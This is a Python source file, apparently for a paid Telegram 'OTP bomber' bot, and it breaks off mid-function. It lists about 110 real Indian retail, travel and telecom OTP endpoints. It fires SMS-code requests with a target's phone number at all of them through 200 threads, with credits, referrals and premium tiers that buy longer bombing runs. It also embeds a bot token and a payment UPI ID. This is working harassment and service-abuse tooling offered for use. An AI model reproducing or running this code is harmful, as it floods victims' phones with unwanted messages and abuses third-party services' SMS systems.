import requests
import json
import time
import re
import sqlite3
import logging
import threading
import asyncio
import qrcode
import sys
import traceback
import os
import signal
from io import BytesIO
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.error import Conflict, TelegramError

# ===== CONFIG =====
BOT_TOKEN = "8612750015:AAFSYU5a8NzEPE2RiP0mvrSoPl94fWjRWPk"
ADMIN_IDS = [8520711928]
FORCE_JOIN_CHANNEL = "@primedraco12"
CHANNEL_LINK = "https://t.me/primedraco12"
MAX_WORKERS = 200
REQUEST_TIMEOUT = 3
USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== AUTO-STOP TIMERS =====
TIMERS = {
    "free": 120,
    "premium_1d": 300,
    "premium_30d": 18000,
    "premium_90d": 28800,
}

active_bombs = {}
bomb_threads = {}
stop_requested = {}
countdown_messages = {}

# ===== DATABASE SETUP =====
DB_PATH = "bomber_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        credits INTEGER DEFAULT 3,
        is_premium INTEGER DEFAULT 0,
        premium_tier TEXT DEFAULT 'free',
        premium_expiry TEXT,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        daily_bonus_date TEXT,
        created_at TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS referrals (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        referrer_id INTEGER,
        referred_id INTEGER,
        bonus_given INTEGER DEFAULT 0,
        created_at TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS usage_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        phone TEXT,
        endpoint_count INTEGER,
        success_count INTEGER,
        duration INTEGER,
        created_at TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('upi_id', 'skhhacker@upi')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('qr_code', '')")
    
    c.execute('''CREATE TABLE IF NOT EXISTS pending_payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        days INTEGER,
        amount INTEGER,
        screenshot TEXT,
        status TEXT DEFAULT 'pending',
        created_at TEXT
    )''')
    
    conn.commit()
    conn.close()

init_db()

# ===== DATABASE HELPERS =====
def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, referred_by=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone():
        conn.close()
        return
    
    import hashlib
    ref_code = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()[:8]
    
    c.execute('''INSERT INTO users 
        (user_id, username, first_name, credits, referral_code, referred_by, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)''',
        (user_id, username, first_name, 3, ref_code, referred_by, datetime.now().isoformat()))
    
    if referred_by:
        c.execute("UPDATE users SET credits = credits + 1 WHERE user_id = ?", (referred_by,))
        c.execute('''INSERT INTO referrals (referrer_id, referred_id, bonus_given, created_at)
            VALUES (?, ?, 1, ?)''', (referred_by, user_id, datetime.now().isoformat()))
    
    conn.commit()
    conn.close()

def update_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def get_credits(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_premium_tier(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT premium_tier, premium_expiry FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    if result and result[0] != 'free':
        if result[1] and datetime.fromisoformat(result[1]) > datetime.now():
            return result[0]
    return 'free'

def is_premium(user_id):
    return get_premium_tier(user_id) != 'free'

def set_premium(user_id, tier, days):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    c.execute("UPDATE users SET is_premium = 1, premium_tier = ?, premium_expiry = ? WHERE user_id = ?", 
              (tier, expiry, user_id))
    conn.commit()
    conn.close()

def can_claim_daily(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT daily_bonus_date FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    if result and result[0]:
        last_claim = datetime.fromisoformat(result[0])
        if (datetime.now() - last_claim).days < 1:
            return False
    return True

def claim_daily(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + 2, daily_bonus_date = ? WHERE user_id = ?", 
              (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def log_usage(user_id, phone, endpoint_count, success_count, duration):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO usage_logs (user_id, phone, endpoint_count, success_count, duration, created_at)
        VALUES (?, ?, ?, ?, ?, ?)''', (user_id, phone, endpoint_count, success_count, duration, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_referral_count(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, credits, premium_tier FROM users")
    users = c.fetchall()
    conn.close()
    return users

def get_referral_details(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT u.user_id, u.first_name, u.username, r.created_at 
        FROM referrals r JOIN users u ON r.referred_id = u.user_id 
        WHERE r.referrer_id = ?''', (user_id,))
    refs = c.fetchall()
    conn.close()
    return refs

# ===== PAYMENT SYSTEM =====
def add_pending_payment(user_id, days, amount, screenshot_file_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO pending_payments (user_id, days, amount, screenshot, created_at)
        VALUES (?, ?, ?, ?, ?)''', (user_id, days, amount, screenshot_file_id, datetime.now().isoformat()))
    payment_id = c.lastrowid
    conn.commit()
    conn.close()
    return payment_id

def get_pending_payment(payment_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM pending_payments WHERE id = ? AND status = 'pending'", (payment_id,))
    result = c.fetchone()
    conn.close()
    return result

def update_payment_status(payment_id, status):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE pending_payments SET status = ? WHERE id = ?", (status, payment_id))
    conn.commit()
    conn.close()

def get_qr_settings():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT key, value FROM settings")
    result = {row[0]: row[1] for row in c.fetchall()}
    conn.close()
    return result

def update_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def get_upi_id():
    return get_qr_settings().get('upi_id', 'skhhacker@upi')

def get_qr_code():
    return get_qr_settings().get('qr_code', '')

# ===== PHONE VALIDATION =====
def clean_phone(phone: str) -> str:
    if not phone:
        return None
    digits = re.sub(r'\D', '', phone)
    if len(digits) >= 10:
        return digits[-10:]
    return None

# ===== ALL ENDPOINTS FROM API2.PY =====
ENDPOINTS = [
    {"url": "https://www.swiggy.com/mapi/auth/sms-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.meesho.com/api/v1/user/login/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone_number": "{phone}"}},
    {"url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://interio.com/otplogin/account/generateotp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://blinkit.com/v2/accounts/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"user_phone": "{phone}"}},
    {"url": "https://app-eks.gonoise.com/website/v2/create/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"value": "{phone}", "type": "phone"}},
    {"url": "https://www.fastrack.in/on/demandware.store/Sites-Fastrack-Site/en_IN/OtpVerification-SendOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"dwfrm_profile_phone": "{phone}"}},
    {"url": "https://api.bookscape.com/ecom/api/auth/send-mobile-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.zara.com/in/en/guest-user/profile/phone/verification/send-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": {"number": "{phone}"}}},
    {"url": "https://www.titan.co.in/on/demandware.store/Sites-Titan-Site/en_IN/OtpVerification-SendOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"dwfrm_profile_phone": "{phone}"}},
    {"url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"telephone": "{phone}", "phoneCode": "+91"}},
    {"url": "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://accounts.olacabs.com/alchemist-api/event/publish/", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://apiext.savaari.com/partner_api/public/send_login_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"user_mobile": "{phone}"}},
    {"url": "https://1.rome.api.flipkart.com/1/action/view", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"actionRequestContext": {"loginId": "{phone}"}}},
    {"url": "https://www.redbus.in/rpw/api/sendOtpV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://nal.tmmumbai.in/auth/v1/sendMobileOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNo": "{phone}"}},
    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"contactNumber": "{phone}"}},
    {"url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/BR/CREATEOTP-V2", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone_number": "91{phone}"}},
    {"url": "https://www.jio.com/api/jio-login-service/login/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://www.shemaroome.com/users/mobile_no_signup", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile_no": "+91{phone}"}},
    {"url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"variables": {"mobile": "{phone}"}}},
    {"url": "https://intapi.dhurina.net/api/checkUserAuth", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://docon.co.in/DocOnSecure/v2/verifyEmail/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {}},
    {"url": "https://session-ms.brevistay.com/userLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"signInMobile": "+91{phone}"}},
    {"url": "https://gkx.gokwik.co/v4/auth/otp/login/trigger", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://www.olx.in/api/auth/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "+91{phone}"}},
    {"url": "https://www.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"j_mobilenumber": "{phone}"}},
    {"url": "https://api-v1.shoppersstop.com/v2/olg/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://api.pizzahut.io/v1/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "+91{phone}"}},
    {"url": "https://jiffy.spencers.in/user/auth/otp/send/v3", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://api.naturesbasket.co.in/user/auth/otp/send/v3", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://api.shopflo.co/heimdall/api/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"oid": "+91{phone}"}},
    {"url": "https://www.clovia.com/api/v4/signup/check-existing-user/", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://www.shyaway.com/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"variables": {"username": "{phone}"}}},
    {"url": "https://www.helioswatchstore.com/smsprofile/index/sendotp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"email": "{phone}"}},
    {"url": "https://www.healthkart.com/veronica/user/validate/1/{phone}/signup", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://api.prod.oziva.in/nitro/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://api.manmatters.com/portal/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://prodapi.newme.asia/web/v2/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://www.1mg.com/pwa-api/auth/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"number": "{phone}"}},
    {"url": "https://accounts.zomato.com/login/phone", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "body_template": {"number": "{phone}"}},
    {"url": "https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"loginId": "{phone}"}},
    {"url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"loginId": "{phone}"}},
    {"url": "https://www.myntra.com/gateway/v1/auth/getotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://dine.dunkinindia.com/order-online/lt-auth-mw/api/userService/sendOtpToPrimary", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"userName": "{phone}"}},
    {"url": "https://www.barbequenation.com/api/v1/generate-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://tsb-mbaas.starbucksindia.net/api/unsec/user/register/v2/update", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://be.mcdelivery.co.in/auth/otp/{phone}/", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://accounts.box8.co.in/customers/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone_no": "{phone}"}},
    {"url": "https://identity.doordash.com/signup/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://www.limeroad.com/auth/get_uuid_v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"user_id": "{phone}"}},
    {"url": "https://cityfurnish.com/api/user/sendOtpV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://force.eazydiner.com/web/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "+91{phone}"}},
    {"url": "https://sparindia.com/api/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://www.quickmobile.in/api/sell-module/user/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://www.cashify.in/api/cu01/v1/sign-up/resend-otp", "method": "PUT", "headers": {"Content-Type": "multipart/form-data"}, "body_template": {"mo": "{phone}"}},
    {"url": "https://budli.in/wp-admin/admin-ajax.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.quikr.com/core/register", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://api.tatadigital.com/api/v2/sso/check-phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://www.recycledevice.com/api/verify-quote-user", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://api.rabimobile.com/api/user/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://www.marutisuzukitruevalue.com/app-service/api/v1/authenticate/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.carandbike.com/my-account", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "body_template": {"_1_LeadForm[mobile]": "{phone}"}},
    {"url": "https://thor.velocity.in/api/public/applications/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://api.spinny.com/api/c/user/otp-request/v6/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"contact_number": "{phone}"}},
    {"url": "https://gateway-api.incred.com/v3/uam/portal/v2/mobile/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"MOBILE": "{phone}"}},
    {"url": "https://www.orra.co.in/otplogin/account/otpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile_number": "{phone}"}},
    {"url": "https://auth.zee5.com/v1/user/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneno": "91{phone}"}},
    {"url": "https://oneapp-wso2.abfldirect.com/oneapp/epl/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "body_template": {"data": "dummy"}},
    {"url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "GET", "headers": {"Channel": "mweb"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://api.workindia.in/api/auth/employer/check-user/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone_no": "{phone}"}},
    {"url": "https://www.naukri.com/central-login-services/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"username": "{phone}"}},
    {"url": "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://api.acharyalavbhushan.com/api/customers/customer-login", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://instamart.in/api/instamart/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"data": {"mobile": "{phone}"}}},
    {"url": "https://www.tanishq.co.in/on/demandware.store/Sites-Tanishq-Site/en_IN/OtpVerification-SendOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"dwfrm_profile_phone": "{phone}"}},
    {"url": "https://www.policyx.com/user_login/customer-login-webservice.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"PhoneNumber": "{phone}"}},
    {"url": "https://www.rupee112.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://www.igp.com/v2/loginSignup", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mob": "{phone}"}},
    {"url": "https://www.gritzo.com/veronica/user/validate/187/{phone}/signup", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://pre.megamartfashions.com/graphql", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"PhoneNumber": "{phone}"}},
    {"url": "https://myairtelapp.bsbportal.com/app/guardian/api/bouncer/v1/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"key": "dummy"}},
    {"url": "https://www.hkvitals.com/veronica/user/validate/42/{phone}/signup", "method": "GET", "headers": {}, "body_template": {}},
    {"url": "https://api.ourlittlejoys.com/portal/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://edge.pickrr.com/aggregator/api/ve1/aggregator-service/user/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"cred": "{phone}"}},
    {"url": "https://login.shopclues.com/user/loginviaotp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"user_login": "{phone}"}},
    {"url": "https://prd0-backend.wewowtech.com/auth-service/ve1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "+91{phone}"}},
    {"url": "https://prod.myjar.app/v2/api/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://mightyzeus.housing.com/api/gql", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"variables": {"phone": "{phone}"}}},
    {"url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://api.production.infra.apna.co/apna-auth-core/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone_number": "91{phone}"}},
    {"url": "https://kapiva-otp-backend-fildzvsanq-el.a.run.app/api/v1/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://gkx.gokwik.co/v1/user/validate/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://antheapi.aakash.ac.in/examapi/generate_register_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {}},
    {"url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "+91{phone}"}},
    {"url": "https://napi.authkey.io/api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://admin.registaniachar.com/api/whatsapp/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://api.ovantica.com/prisma/ovanticainventory//user_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
    {"url": "https://prodbackend.oruphones.com/user/login/sOtpCreate", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobileNumber": "{phone}"}},
    {"url": "https://static.127777.com/api/india_api_write/20march2020/sendvcode.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://getinstacash.in/sell/getData.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body_template": {"mobile": "{phone}"}},
    {"url": "https://api.breezesdk.store/session/start", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phoneNumber": "{phone}"}},
    {"url": "https://api.tatadigital.com/api/v2/sso/check-phone-croma", "method": "POST", "headers": {"Content-Type": "application/json"}, "body_template": {"phone": "{phone}"}},
]

# ===== FAST BOMBER =====
def send_otp_fast(endpoint: dict, phone: str) -> dict:
    try:
        url = endpoint["url"].replace("{phone}", phone)
        method = endpoint.get("method", "POST")
        headers = endpoint.get("headers", {}).copy()
        body_template = endpoint.get("body_template", {})
        
        body = {}
        for key, val in body_template.items():
            if isinstance(val, str):
                body[key] = val.replace("{phone}", phone)
            elif isinstance(val, dict):
                body[key] = json.loads(json.dumps(val).replace("{phone}", phone))
            else:
                body[key] = val
        
        headers["User-Agent"] = USER_AGENT
        headers["Accept"] = "*/*"
        headers["Connection"] = "close"
        
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method.upper() == "PUT":
            resp = requests.put(url, headers=headers, data=body if "multipart" in headers.get("Content-Type", "") else json.dumps(body), timeout=REQUEST_TIMEOUT)
        else:
            if "multipart/form-data" in headers.get("Content-Type", ""):
                resp = requests.post(url, headers=headers, data=body, timeout=REQUEST_TIMEOUT)
            elif "x-www-form-urlencoded" in headers.get("Content-Type", ""):
                resp = requests.post(url, headers=headers, data=body, timeout=REQUEST_TIMEOUT)
            else:
                resp = requests.post(url, headers=headers, json=body, timeout=REQUEST_TIMEOUT)
        return {"url": url, "status": resp.status_code, "success": resp.status_code in [200, 201, 202, 204]}
    except Exception as e:
        return {"url": endpoint["url"], "status": 0, "success": False, "error": str(e)}

def bomb_phone_fast(phone: str, user_id: int, endpoints: list = None, max_workers: int = MAX_WORKERS) -> tuple:
    if not endpoints:
        endpoints = ENDPOINTS
    
    results = []
    stop_requested[user_id] = False
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(send_otp_fast, ep, phone): ep for ep in endpoints}
        for future in as_completed(futures):
            if stop_requested.get(user_id, False):
                break
            results.append(future.result())
    
    success_count = sum(1 for r in results if r.get("success", False))
    return results, success_count

# ===== AUTO-STOP TIMER WITH COUNTDOWN =====
def start_bomb_timer(user_id: int, phone: str, duration: int, context):
    end_time = time.time() + duration
    active_bombs[user_id] = {
        "phone": phone,
        "end_time": end_time,
        "status": "running",
        "tier": get_premium_tier(user_id)
    }
    
    def timer_callback():
        if user_id in active_bombs:
            active_bombs[user_id]["status"] = "stopped"
            stop_requested[user_id] = True
            time.sleep(5)
            if user_id in active_bombs:
                del active_bombs[user_id]
            if user_id in stop_requested:
                del stop_requested[user_id]
            if user_id in countdown_messages:
                del countdown_messages[user_id]
    
    timer = threading.Timer(duration, timer_callback)
    timer.daemon = True
    timer.start()
    bomb_threads[user_id] = timer

def update_countdown(user_id, duration, context):
    remaining = duration
    while remaining > 0 and user_id in active_bombs and active_bombs[user_id]["status"] == "running":
        remaining = int(active_bombs[user_id]["end_time"] - time.time())
        if remaining <= 0:
            break
        
        mins = remaining // 60
        secs = remaining % 60
        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
        
        try:
            if user_id in countdown_messages:
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(
                        context.bot.edit_message_text(
                            chat_id=user_id,
                            message_id=countdown_messages[user_id],
                            text=f"⏱ Countdown: {time_str}\n━━━━━━━━━━━━━━━━━\n\nBombing in progress...\nUse STOP BOMB to cancel."
                        )
                    )
                    loop.close()
                except:
                    pass
        except:
            pass
        
        time.sleep(1)
    
    if user_id in countdown_messages:
        try:
            del countdown_messages[user_id]
        except:
            pass

def stop_bomb(user_id: int):
    if user_id in active_bombs:
